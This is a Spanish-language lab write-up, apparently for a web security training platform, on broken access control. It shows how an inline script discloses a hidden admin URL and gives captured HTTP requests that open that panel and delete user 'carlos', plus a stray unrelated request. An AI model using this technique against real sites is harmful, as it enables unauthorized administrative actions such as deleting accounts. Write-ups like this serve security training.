# 🌎 Laboratorio: Funcionalidad de administración desprotegida con URL impredecible

**Control de acceso**

Los controles de acceso están diseñados para evitar que los usuarios interactúen con datos o funciones para las que no tienen los permisos pertinentes. Debido al obvio impacto en la seguridad, los controles de acceso rotos son errores críticos en sí mismos. A menudo también brindan acceso a más superficie de ataque, lo que podría contener vulnerabilidades adicionales.

```python
// Some code

Funcionalidad de administración desprotegida con URL impredecible y DIVULGADA POR SCRIPT DE .JS

Laboratorio: funcionalidad de administración desprotegida con URL impredecible






DIVULGACION EN HTML EN LINEA:


<script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-fxb17t');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>











GET /admin-fxb17t HTTP/1.1
Host: 0a78004e045171728337293200df00c6.web-security-academy.net
Cookie: session=6UOFogDYNNWSpgkhPOPB0esmUTJugV5F
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close







GET /admin-fxb17t/delete?username=carlos HTTP/2
Host: 0a78004e045171728337293200df00c6.web-security-academy.net
Cookie: session=6UOFogDYNNWSpgkhPOPB0esmUTJugV5F
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a78004e045171728337293200df00c6.web-security-academy.net/admin-fxb17t
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9




GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close







GET /admin-fxb17t HTTP/2
Host: 0a78004e045171728337293200df00c6.web-security-academy.net
Cookie: session=6UOFogDYNNWSpgkhPOPB0esmUTJugV5F
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a78004e045171728337293200df00c6.web-security-academy.net/admin-fxb17t
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9


```
